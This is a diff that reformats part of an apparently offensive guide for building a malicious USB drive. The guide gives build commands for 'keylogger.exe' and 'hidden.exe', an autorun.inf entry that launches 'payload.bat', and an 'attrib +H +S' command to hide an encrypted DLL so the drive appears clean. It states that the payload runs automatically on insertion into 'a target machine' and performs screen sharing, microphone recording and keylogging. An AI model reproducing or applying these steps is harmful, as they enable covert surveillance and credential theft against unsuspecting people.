@@ -15,22 +15,21 @@ Compile the Keylogger (keylogger.exe)
 
 g++ keylogger.cpp -o keylogger.exe
 
-#Or if you're using Visual Studio:
+Or if you're using Visual Studio:
 
-  #Open the .cpp file in Visual Studio.
-  #Build as a Console Application.
-  #Save the output as keylogger.exe.
+    Open the .cpp file in Visual Studio.
+    Build as a Console Application.
+    Save the output as keylogger.exe.
 
-#Compile the Hidden EXE (hidden.exe)
+Compile the Hidden EXE (hidden.exe)
 
 g++ hidden.exe.cpp -o hidden.exe
 
-#Or in Visual Studio:
+Or in Visual Studio:
 
-
-  #Open the .cpp file in Visual Studio.
-  #Build as a Console Application.
-  #Save the output as hidden.exe.
+    Open the .cpp file in Visual Studio.
+    Build as a Console Application.
+    Save the output as hidden.exe.
 
 3. Create the Encrypted DLL (encrypted.dll)
 
@@ -83,8 +82,7 @@ open=payload.bat
 action=run
 icon=icon.ico
 
-#You can also add a shortcut or icon if you have one.
-
+You can also add a shortcut or icon if you have one.
 6. Test the USB Payload
 
     Insert the USB drive into a target machine.
@@ -100,13 +98,13 @@ icon=icon.ico
 
 7. Optional: Add a Hidden File or Encrypted File
 
-#You can also add a hidden file or encrypted file to the USB drive to make it appear clean:
+You can also add a hidden file or encrypted file to the USB drive to make it appear clean:
 
 attrib +H +S encrypted.dll
 
-#This will hide the file from the user.
+This will hide the file from the user.
 
-#Final Result (if nothing fucked up):
+Final Result (if nothing fucked up):
 
     Runs automatically on insertion.
     Performs screen sharing, microphone recording, and keylogging.
